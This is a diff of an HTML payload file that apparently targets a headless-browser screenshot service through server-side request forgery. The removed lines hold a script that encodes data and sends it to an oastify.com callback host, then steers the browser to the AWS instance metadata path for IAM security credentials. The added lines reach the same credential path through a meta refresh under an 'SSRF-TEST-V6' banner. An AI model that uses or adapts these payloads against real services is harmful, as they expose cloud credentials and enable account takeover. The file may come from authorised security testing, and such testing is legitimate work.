@@ -1,18 +1,9 @@
 <!DOCTYPE html>
 <html>
-<script>
-var CB = 'https://xtugidit39jm7kmw4cl0ut51fslk99.oastify.com';
-
-function exfil(tag, data) {
-  var enc;
-  try { enc = btoa(unescape(encodeURIComponent(String(data).slice(0, 3000)))); } catch(e) { enc = 'ERR'; }
-  try { var x = new XMLHttpRequest(); x.open('GET', CB + '/x?t=' + encodeURIComponent(tag) + '&d=' + enc, false); x.send(); } catch(e) {}
-}
-
-exfil('start', 'v5-navigate-imds');
-
-// Navigate Chrome to AWS IMDS - the screenshooter will screenshot the response
-// Puppeteer follows the navigation and the thumbnail captures the plaintext credentials
-window.location.href = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
-</script>
+<head>
+<meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+</head>
+<body style="background:#ffff00;color:#ff0000;font-size:40px;font-weight:bold;font-family:monospace">
+SSRF-TEST-V6
+</body>
 </html>
